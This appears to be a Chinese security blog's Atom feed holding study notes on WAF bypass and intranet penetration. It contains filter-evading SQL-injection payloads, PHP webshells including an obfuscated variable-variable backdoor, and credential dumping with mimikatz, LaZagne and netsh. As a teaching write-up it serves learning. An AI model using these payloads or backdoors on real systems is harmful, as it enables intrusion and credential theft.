<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>forg12_blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-02-27T23:04:43.004Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>forg12</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/02/26/WAF%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2022/02/26/WAF%E7%BB%95%E8%BF%87/</id>
    <published>2022-02-26T14:46:54.610Z</published>
    <updated>2022-02-27T23:04:43.004Z</updated>
    
    <content type="html"><![CDATA[<p>WAF拦截会出现在安全测试的各个层面，掌握各个层面的分析和绕过技术最为关键。</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>信息收集是WAF绕过的第一步，若是信息收集出现问题，后续的操作就不好进行。</p><h2 id="1-测试环境"><a href="#1-测试环境" class="headerlink" title="1.测试环境"></a>1.测试环境</h2><p>aliyun-os<br>BT<br>safedog</p><h2 id="2-绕过分析"><a href="#2-绕过分析" class="headerlink" title="2.绕过分析"></a>2.绕过分析</h2><p>抓包技术<br>WAF说明<br>FUZZ测试</p><h2 id="3-绕过手法"><a href="#3-绕过手法" class="headerlink" title="3.绕过手法"></a>3.绕过手法</h2><h3 id="3-1数据包特征"><a href="#3-1数据包特征" class="headerlink" title="3.1数据包特征"></a>3.1数据包特征</h3><h4 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h4><p>就是更改请求方式，去请求数据。例如：Head方式改为GET方式请求数据。</p><h4 id="模拟用户"><a href="#模拟用户" class="headerlink" title="模拟用户"></a>模拟用户</h4><p>将使用工具请求网站所提交的数据包尽可能的像用户使用浏览器访问所提交的数据包。</p><h4 id="爬虫引擎"><a href="#爬虫引擎" class="headerlink" title="爬虫引擎"></a>爬虫引擎</h4><p>这个不是通用的，这个属于部分WAF上面的一个特有的性值。WAF上面有黑白名单机制。在网站中加入到黑名单就代表禁止访问。白名单就是不进行拦截，符合规则可以任意访问。</p><h4 id="白名单机制"><a href="#白名单机制" class="headerlink" title="白名单机制"></a>白名单机制</h4><h3 id="3-2请求速度"><a href="#3-2请求速度" class="headerlink" title="3.2请求速度"></a>3.2请求速度</h3><h4 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h4><h4 id="代理池"><a href="#代理池" class="headerlink" title="代理池"></a>代理池</h4><p>代理就是你的请求先发到代理服务器上，代理服务器再转发给目标服务器。<br>作用就是当使用其中的一个IP去请求目标网站时被封了，那么可以换另一个IP继续对该网站进行访问。<br>当对阿里云的服务器扫描时扫的扫的就会找不到网站，原因是阿里云屏蔽了的IP。自带的阿里云防护对于扫描工具防护 的比较厉害。</p><h4 id="爬虫引擎-1"><a href="#爬虫引擎-1" class="headerlink" title="爬虫引擎"></a>爬虫引擎</h4><h4 id="白名单机制-1"><a href="#白名单机制-1" class="headerlink" title="白名单机制"></a>白名单机制</h4><h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><h4 id="awvs-xray漏扫Payload绕过-延时白名单burpsuite作为中转"><a href="#awvs-xray漏扫Payload绕过-延时白名单burpsuite作为中转" class="headerlink" title="awvs+xray漏扫Payload绕过-延时白名单burpsuite作为中转"></a>awvs+xray漏扫Payload绕过-延时白名单burpsuite作为中转</h4><p><img src="WAF%E7%BB%95%E8%BF%87.assets/1636425067706-9eed5180-9166-4b3f-ba21-1609d7ad1acf.png" alt="image.png"><br> !<img src="WAF%E7%BB%95%E8%BF%87.assets/1636425077567-08544df8-9d19-4b14-ab90-d7d44285f058.png" alt="image.png"><br>!<img src="WAF%E7%BB%95%E8%BF%87.assets/1636425083407-24923fc6-9e06-4b65-a39f-3942285960d0.png" alt="image.png"></p><p>代理池网站：<a href="https://www.kuaidaili.com/pricing/">https://www.kuaidaili.com/pricing/</a></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h2><h3 id="手工注入绕过"><a href="#手工注入绕过" class="headerlink" title="手工注入绕过"></a>手工注入绕过</h3><p>①敏感字符绕过 如 union，ordery by 等相关关键字 使用/<strong>/ (注释)绕过 WAF 对敏感字段的查询如 database(); 如 database 后使用 database/</strong>/<br>②联合绕过 %23 代表 # %0A 代表一个换行符 union %23a%0Aselect 1,2,3;%23 如：<br>①id=1%20union %23a%0Aselect 1,2,3;%23<br>②id=1/<em><em>&amp;id=-1%20 union%20 select%201,2,3%23</em>/<br>③id=1%20union/*!44509select</em>/%201,2,3 （大于 4.4509 版 本运行） /<em>!x</em>/ 代表当 mysql 数据库版本大于 x 时, mysql 不再当作注 释，从而将其运行，这是 mysql 的特性</p><h1 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h1><h2 id="后门绕过"><a href="#后门绕过" class="headerlink" title="后门绕过"></a>后门绕过</h2><h3 id="简单绕过"><a href="#简单绕过" class="headerlink" title="简单绕过"></a>简单绕过</h3><p>简单后门只是用于简单的学习,而在真实环境中，该后门语句会被直 接 WAF 所检测到，此时就需要我们进行简单的变换。注意：一般情况下多数用 assert 函数因为 assert 能写入变量执行，而 eval 却不行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]); <span class="meta">?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> assert(<span class="variable">$_POST</span>[<span class="string">&#x27;x&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>WAF 检测不到可变的变量时，就会放行也就是无法检测到 木马后门文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="variable">$$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;y&#x27;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="variable">$b</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;z&#x27;</span>]); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>后门文件为 1.php 则，在服务器上使用 <a href="http://ip/1.php?x=b&amp;y=assert">http://IP/1.php?x=b&amp;y=assert</a> 即可 实现因为这样赋值后$a=b $$a=assert=$b 所以直接变成了 assert($_POST[‘z’]);<br>​</p><h3 id="加密传输"><a href="#加密传输" class="headerlink" title="加密传输"></a>加密传输</h3><p>思路：<br>后门直接调用 system|phpinfo 等敏感字段时会被 BT 所拦截，尤其是 BT 的 WAF 会拦截 /* 字符的出现，在绕过时，就需要配合截断(%00)，去处理或者相关加密技术 在上述调用 phpinfo() 时，是没开启 BT 的，之开启 safedog 模式，所以没有出现拦截， 一旦开启了 BT，就会对特殊的关键词进行拦截。</p><p>!<img src="WAF%E7%BB%95%E8%BF%87.assets/1636425548820-7ece9d51-3a4a-473e-9d45-e7af3c69ff71.png" alt="image.png"></p><h3 id="加密混淆"><a href="#加密混淆" class="headerlink" title="加密混淆"></a>加密混淆</h3><p>思路：<br>既然可以加密传输，就会有其它加密的方法，就有了加密混淆使得 WAF 软件无 法检测到关键字段同样达到 WAF 的绕过 。<br>PHP 混淆加密脚本下载地址： <a href="https://github.com/djunny/enphp">https://github.com/djunny/enphp</a></p><h2 id="权限软件"><a href="#权限软件" class="headerlink" title="权限软件"></a>权限软件</h2><p>菜刀：<br>未更新状态，无插件，单向加密传输<br>蚁剑：<br>更新状态，有插件，拓展性强，单向加密传输<br>冰蝎：<br>更新状态，未知插件，双向加密传输</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;WAF拦截会出现在安全测试的各个层面，掌握各个层面的分析和绕过技术最为关键。&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;p&gt;信息收集是WAF绕过的第一步，若</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>内网安全</title>
    <link href="http://example.com/2022/02/10/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    <id>http://example.com/2022/02/10/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/</id>
    <published>2022-02-10T08:36:20.000Z</published>
    <updated>2022-02-27T23:01:45.199Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-基本认识"><a href="#1-基本认识" class="headerlink" title="1.基本认识"></a>1.基本认识</h1><p><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637035658346-55551cfe-a36f-4881-b7af-769ddef7267b.png" alt="image.png"><br><strong>DMZ：</strong></p><ul><li>英文全名“Demilitarized Zone”，中文含义是“隔离区”，在安全领域的具体含义是“内外网防火墙之间的区域”。DMZ区是一个缓冲区，在DMZ区存放着一些公共服务器，比如论坛等。</li></ul><p><strong>工作组 VS 域环境：</strong></p><ul><li>工作组：地位平等，管理分散，没有集中管理。</li><li>域环境：地位不平等，管理集中，实现集中管理。</li><li>域环境也可以简单的理解为工作组的升级版，更好管理。</li><li>这里我们把域环境和工作组区分开来是因为他们的攻击手段不同，工作组中的攻击手法如DNS劫持、ARP欺骗在域环境下是没有作用的。有一些攻击手段需要一些条件，这些条件在域环境下没有，相应的攻击手段就会失效。</li></ul><p><strong>域控制器DC</strong>：</p><ul><li>域控DC是这个域中的管理者，域里面的最高权限，判断是否拿下整个域，就是看你是否拿下这台域控制器。</li></ul><p><strong>AD（活动目录）：</strong></p><ul><li>是微软所提供的目录服务（查询，身份验证），活动目录的核心包含了活动目录数据库，在活动目录数据库中包含了域中所有的对象（用户，计算机，组…），活动目录(Active Directory)是面向Windows Standard Server、Windows Enterprise Server 以及Windows Datacenter Server的目录服务。Active Directory储存了有关网络对象的信息，并且让管理员和用户能够轻松的查找和使用这些信息，Active Directory使用了一种结构化的数据储存方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。</li></ul><p><strong>linux域渗透问题：</strong></p><ul><li>Q：AD域控制器只在windows server系统能做吗？Linux可以？</li><li>A：linux上也有相应的活动目录的，不过要装LDAP环境，一般企很少会用LDAP来管理的，因为功能上不及域强大，而且用linux来管理的话要求技术人员门槛也比较高，个人认为Linux还是比较适合做服务器好一点。（就是说Linux上面的域环境需要环境支撑，而且功能没有windows上的域强大，所以大部分我们遇见的都是windows，这也是没有Linux的原因。当然，Linux这个操作系统也是可以加入域的，比如域内有Linux的操作系统，有Linux的服务器也行，只是很少）</li></ul><p><strong>局域网技术适用问题：</strong></p><ul><li>不同的攻击技术手段适用面不同，这个我们要有所了解，比如arp欺骗适用于局域网，而不适用于域。</li></ul><p><strong>大概内网安全流程问题：</strong></p><ul><li>熟悉基础概念-信息收集-后续探针-权限提升-横向渗透-权限维持</li></ul><h1 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h1><h2 id="2-1基本信息收集"><a href="#2-1基本信息收集" class="headerlink" title="2.1基本信息收集"></a>2.1基本信息收集</h2><p>旨在了解当前服务器的计算机基本信息，为后续判断服务器角色，网络环境等做准备。<br>服务器角色就是这台服务器是干嘛的，它在内网中扮演什么角色，比如mary-pc就是个人办公电脑，SqlServer就是数据库服务器，每台服务器都是有一个角色的，是仅仅个人用，还是用来文件传输？用来dns解析？</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 假设已经拿下了一台内网服务器webserver：</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 详细信息（操作系统版本、补丁编号等信息）</span></span><br><span class="line">systeminfo </span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动服务（查看当前主机开启了哪些服务，从服务中就可以判断它是什么角色）</span></span><br><span class="line">net start</span><br><span class="line"><span class="meta">#</span><span class="bash"> 进程列表（查看当前主机开启了哪些进程）</span></span><br><span class="line">tasklist </span><br><span class="line"><span class="meta">#</span><span class="bash"> 计划任务：</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> （若报错无法加载列资源，说明你的权限不够，因此要提权才能使用该命令）</span></span><br><span class="line">schtasks </span><br></pre></td></tr></table></figure><h2 id="2-2网络信息收集"><a href="#2-2网络信息收集" class="headerlink" title="2.2网络信息收集"></a>2.2网络信息收集</h2><p>旨在了解当前服务器的网络接口信息，为判断当前角色，功能，网络架构做准备</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 判断存在域-最简单方式查看主DNS后缀</span></span><br><span class="line">ipconfig /all </span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断存在域</span></span><br><span class="line">net view /domain </span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断主域（主域就是域控的意思）【在域环境下查看当前时间】</span></span><br><span class="line">net time /domain </span><br><span class="line"><span class="meta">#</span><span class="bash"> 追踪来源地址</span></span><br><span class="line">nslookup &lt;域控制器全名&gt; </span><br><span class="line"><span class="meta">#</span><span class="bash"> 当前网络端口开放</span></span><br><span class="line">netstat -ano </span><br></pre></td></tr></table></figure><p>&lt;1&gt;ipconfig /all 查看主DNS后缀，这就是当前最简单最直接判断当前服务器是域环境还是单纯的工作组局域网环境！有域的话会有主DNS，因为在域环境里面通常会由DNS解析服务器。这是第一个判断标准。<br><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637037217069-92850a47-96ec-40a6-af6d-d663c7aa1056.png" alt="image.png"><br>&lt;2&gt;net view /domain 判断存在域<br><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637037245281-d03af11d-4e0b-4d0e-ad66-5288a0dd275e.png" alt="image.png"><br>&lt;3&gt;net time /domain 判断主域（主域就是域控的意思）【在域环境下查看当前时间】<br>net time /domain  可以判断主域，是因为域成员计算机的时间一般会以域控制器为准，所以当执行net time /domain命令时，该计算机会去域控获取时间，此时返回的OWA2010CN-God.god.org就是域控的计算机全名。然后可以通过nslookup来最终确认域控IP。<br>每一台计算机名字都是基于域名下面生成的（如SqlServer.god.org），另外，如果找到了god.org、sqlserver.god.org、xiaodi.sqlserver.god.org之类的计算机全名，说明当前环境存在多域，sqlserver.god.org是父域，xiaodi.sqlserver.god.org是子域。<br><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637037265210-424a8538-89da-492a-b808-b596668903b7.png" alt="image.png"><br>&lt;4&gt;nslookup &lt;域控制器全名&gt;  追踪来源地址<br>OWA2010CN-God.god.org就是域控的计算机全名，我们可以通过nslookup和ping命令去ping这个名字来获取域控的对应ip地址。<br><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637037284532-a7722f3a-1e26-432d-bec3-151168f923e5.png" alt="image.png"><br>&lt;5&gt;netstat -ano 查看当前网络端口开放<br><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637037298414-89e204fd-9c8b-4df9-ac52-a5aafa064a3b.png" alt="image.png"></p><h2 id="2-3用户信息收集★★"><a href="#2-3用户信息收集★★" class="headerlink" title="2.3用户信息收集★★"></a>2.3用户信息收集★★</h2><p>旨在了解当前计算机或域环境下的用户及用户组信息，便于后期利用凭据进行测试<br>​</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 系统默认常见用户身份：</span></span><br><span class="line">Domain Admains：域管理员（默认对域控制器有完全控制权）</span><br><span class="line">Domain Computers：域内机器</span><br><span class="line">Domain Controllers：域控制器</span><br><span class="line">Domain Guest：域访客，权限低</span><br><span class="line">Domain users：域用户</span><br><span class="line">Enterprise Admains：企业系统管理员用户（默认对域控有完整控制权）</span><br><span class="line"></span><br><span class="line">Ps：我们主要攻击Domain Admains和Enterprise Admains</span><br><span class="line">大部分成员主机在Domain users域用户里</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 相关用户收集操作命令：</span></span><br><span class="line">whoami /all 用户权限</span><br><span class="line">net config workstation 登录信息</span><br><span class="line">net user 当前电脑里面的用户（本地用户）</span><br><span class="line">net localgroup 本地用户组</span><br><span class="line">net user /domain 当前域里面的用户</span><br><span class="line">net group /domain 获取域用户组信息</span><br><span class="line">wmic useraccount get /all 涉及域用户详细信息</span><br><span class="line">net group &quot;Domain Admins&quot; /domain 查询域管理员账户</span><br><span class="line">net group &quot;Enterprise Admins&quot; /domain 查询管理员用户组</span><br><span class="line">net group &quot;Domain Controllers&quot; /domain 查询域控制器</span><br></pre></td></tr></table></figure><p>收集用户信息的作用：</p><ul><li>先找到域用户名，为后续进行密码账号的攻击做准备，后续攻击是可以用这些真实的用户名套用密码字典进行暴力破解，一旦找到对应的密码就可以登录计算机进行后续操作。看看用户名在哪个组，我就有什么权限。</li></ul><p>&lt;1&gt;net user 获取当前电脑里面的用户（本地用户），对于本地用户，当前计算机可通过用户名密码登录。<br>net user /domain 获取当前域里面的用户，对于域用户，当前计算机是否可登录，受活动目录限制，若权限不够，是不能登录的。<br><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637037712248-a4c3c844-f348-4db0-894c-a99e822e66fb.png" alt="image.png"><br>&lt;2&gt;net localgroup 本地用户组<br><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637037740617-6c55a89b-e548-4955-bb47-af70d034cb1c.png" alt="image.png"><br>&lt;3&gt;net group /domain 获取域用户组信息<br><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637037754731-28fb51cb-8a08-435c-b007-786717b35822.png" alt="image.png"><br> &lt;4&gt;wmic useraccount get /all 涉及域用户详细信息<br><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637037769730-f7a8f886-68de-4692-bc55-7530bc4e9a64.png" alt="image.png"><br>&lt;5&gt;net group “Domain Admins” /domain 查询域管理员账户<br><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637037779617-0f29d0ee-77ed-41a0-a198-ca6eb975971b.png" alt="image.png"><br>&lt;6&gt;net group “Domain users” /domain 查询域用户<br><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637037799377-d460f364-b846-434c-aa54-213960f22ce6.png" alt="image.png"></p><h2 id="2-4凭据信息收集★★★"><a href="#2-4凭据信息收集★★★" class="headerlink" title="2.4凭据信息收集★★★"></a>2.4凭据信息收集★★★</h2><p>旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备<br>人能够记住的密码有限，所以一般用户习惯给很多网站、服务等设置相同的或者类似的密码，所以当你找到了一个密码，其他密码很有可能被猜解到。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">计算机用户HASH，明文获取   -mimikatz（win），mimipenguin（linux）</span><br><span class="line">计算机各种协议服务口令获取   -LaZagne（all,win&amp;linux），XenArmor（win）</span><br><span class="line"></span><br><span class="line">Netsh WLAN show profiles  //查询所有连接过的wifi名称</span><br><span class="line">Netsh WLAN show profile name =&quot;无线名称&quot; key =clear  //查询某wifi密码</span><br><span class="line"> </span><br><span class="line">获取凭据的方法：</span><br><span class="line">1.站点源码备份文件，数据库备份文件等</span><br><span class="line">2.各类数据库WEB管理入口，如PHPmyadmin</span><br><span class="line">3.浏览器保存密码，浏览器cookies</span><br><span class="line">4.其他用户会话，3389和ipc$连接记录，回收站内容</span><br><span class="line">5.windows 保存的WIFI密码</span><br><span class="line">6.网络内部的各种账号和密码，如：Email，VPN，FTP，OA等</span><br></pre></td></tr></table></figure><h3 id="2-4-1获取计算机用户名密码-mimikatz-amp-mimipenguin"><a href="#2-4-1获取计算机用户名密码-mimikatz-amp-mimipenguin" class="headerlink" title="2.4.1获取计算机用户名密码 mimikatz &amp; mimipenguin"></a>2.4.1获取计算机用户名密码 mimikatz &amp; mimipenguin</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> mimikatz下载：</span></span><br><span class="line">https://github.com/gentilkiwi/mimikatz/releases</span><br><span class="line"><span class="meta">#</span><span class="bash"> mimipenguin下载：</span></span><br><span class="line">https://github.com/huntergregal/mimipenguin/releases/</span><br></pre></td></tr></table></figure><p>新版mimikatz貌似运行有问题，下面是旧版运行结果，获取到了明文密码。注意：mimikatz运行需要域管理员权限，域用户无法运行，因为权限不够。<br><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637038393133-16e8ebb1-808a-41b4-bc65-59e73ac1e485.png" alt="image.png"><br>同样，mimipenguin运行需要root权限，普通用户无法运行。!<img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637038402684-f320285f-ab2a-4873-a82f-6942c6bd7734.png" alt="image.png"></p><h3 id="2-4-2获取计算机各种协议服务口令-LaZagne（all-win-amp-linux）-amp-XenArmor（win）"><a href="#2-4-2获取计算机各种协议服务口令-LaZagne（all-win-amp-linux）-amp-XenArmor（win）" class="headerlink" title="2.4.2获取计算机各种协议服务口令 LaZagne（all,win&amp;linux） &amp; XenArmor（win）"></a>2.4.2获取计算机各种协议服务口令 LaZagne（all,win&amp;linux） &amp; XenArmor（win）</h3><h4 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">● 优点：免费；自动化脚本；支持win&amp;linux</span><br><span class="line">● 缺点：很多密码都获取不到，不好用</span><br><span class="line">● 下载：https://github.com/AlessandroZ/LaZagne</span><br></pre></td></tr></table></figure><p><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637054017178-495d7bb6-bbf0-44eb-8cdd-534d8da045ea.png" alt="image.png"></p><h4 id="XenArmor"><a href="#XenArmor" class="headerlink" title="XenArmor"></a>XenArmor</h4><ul><li>国外软件，价格40-50美元，网上可能有破解版，不过是老版</li></ul><p><img src="%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8.assets/1637054011562-ad95992f-e59e-4c09-897d-e41a4301b9df.png" alt="image.png"><br> 这两个软件主要是通过自动化翻找以下内容，从而获取凭据。</p><ul><li>1.站点源码备份文件，数据库备份文件等</li><li>2.各类数据库WEB管理入口，如PHPmyadmin</li><li>3.浏览器保存密码，浏览器cookies</li><li>4.其他用户会话，3389和ipc$连接记录，回收站内容</li><li>5.windows 保存的WIFI密码</li><li>6.网络内部的各种账号和密码，如：Email，VPN，FTP，OA等</li></ul><h2 id="2-5探针主机域控架构服务"><a href="#2-5探针主机域控架构服务" class="headerlink" title="2.5探针主机域控架构服务"></a>2.5探针主机域控架构服务</h2><p>为后续横向思路做准备，针对应用，协议等各类攻击手法</p><h3 id="2-5-1探针域控制器名及地址信息"><a href="#2-5-1探针域控制器名及地址信息" class="headerlink" title="2.5.1探针域控制器名及地址信息"></a>2.5.1探针域控制器名及地址信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br><span class="line">nslookup &lt;域控名称&gt;</span><br><span class="line">ping &lt;域控名称&gt;</span><br><span class="line">  </span><br></pre></td></tr></table></figure><h3 id="2-5-2探针域内存活主机及地址信息"><a href="#2-5-2探针域内存活主机及地址信息" class="headerlink" title="2.5.2探针域内存活主机及地址信息"></a>2.5.2探针域内存活主机及地址信息</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> nbtscan下载：</span></span><br><span class="line">http://unixwiz.net/tools/nbtscan.html</span><br><span class="line"><span class="meta">#</span><span class="bash"> 第三方工具（老牌工具，说实在没必要用这个工具，不强大！不免杀！）</span></span><br><span class="line">nbtscan 192.168.3.0/24 </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 自带内部命令（推荐使用）</span></span><br><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr &quot;TTL =&quot; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">其他：nmap，masscan，第三方Powershell脚本nishang、empire等（个人喜欢NiShang）</span><br></pre></td></tr></table></figure><p><strong>empire？？？？？</strong><br>NiShang简介：<br>Powershell用于渗透测试其实早在多年前就已经被提出了。利用Powershell，攻击者可以在无需接触磁盘的情况下执行命令等，并且相较已经被大家广泛关注并防御的Cmd而言，Powershell并非那么的引人瞩目。Nishang是基于PowerShell的渗透测试专用工具。它集成了框架、脚本和各种payload，能够帮助渗透测试人员在对Windows目标的全过程检测中使用，是一款来源于作者实战经历的智慧结晶。（类似于MSF）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &lt;1&gt;下载NiShang：</span></span><br><span class="line">https://github.com/samratashok/nishang</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;2&gt;进入目录，执行以下命令</span></span><br><span class="line"><span class="comment"># 导入模块nishang</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\nishang.psml        </span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置执行策略</span></span><br><span class="line"><span class="built_in">set-ExecutionPolicy</span> RemoteSigned    </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取模块nishang的命令函数（有很多命令函数分别执行不同功能，比如以下命令）</span></span><br><span class="line"><span class="built_in">Get-Command</span> <span class="literal">-Module</span> nishang</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取常规计算机信息</span></span><br><span class="line"><span class="built_in">Get-information</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取计算机用户名密码</span></span><br><span class="line"><span class="built_in">Invoke-Mimikatz</span>             </span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口扫描（查看目录对应文件有演示语法，其他同理）</span></span><br><span class="line"><span class="built_in">Invoke-Portscan</span> <span class="literal">-startaddress</span> <span class="number">192.168</span>.<span class="number">3.0</span> <span class="literal">-Endaddress</span> <span class="number">192.168</span>.<span class="number">3.100</span> <span class="literal">-ResolveHost</span> <span class="literal">-ScanPort</span>  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他功能：删除补丁，反弹shell，凭据获取等</span></span><br></pre></td></tr></table></figure><h3 id="2-5-3探针域内主机角色及服务信息"><a href="#2-5-3探针域内主机角色及服务信息" class="headerlink" 